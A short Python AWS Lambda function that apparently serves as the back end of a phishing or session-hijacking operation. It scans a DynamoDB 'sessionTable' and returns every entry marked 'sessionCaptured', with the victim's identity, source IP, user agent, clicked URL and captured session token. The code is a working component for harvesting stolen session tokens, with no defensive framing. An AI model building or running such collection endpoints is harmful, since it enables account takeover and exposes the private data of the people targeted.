import json
import boto3


def dump_table():
    dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
    table = dynamodb.Table('sessionTable')
    return parse_data(table.scan()['Items'])


def parse_data(data):
    res = []
    for click in data:
        if click['sessionCaptured']:
            res.append(
                {
                    'victim': str(click['victim']),
                    'soureIp': str(click.get('soureIp')),
                    'userAgent': str(click['userAgent']),
                    'urlClicked': str(click['urlClicked']),
                    'sessionCaptured': str(click['sessionCaptured']),
                    'token': str(click['token']),
                    'urlExpires': str(click['urlExpires'])
                }
            )
    return res

def main(event, context):

    data = dump_table()
    
    response = {
        "statusCode": 200,
        "body": json.dumps(data)
    }

    return response
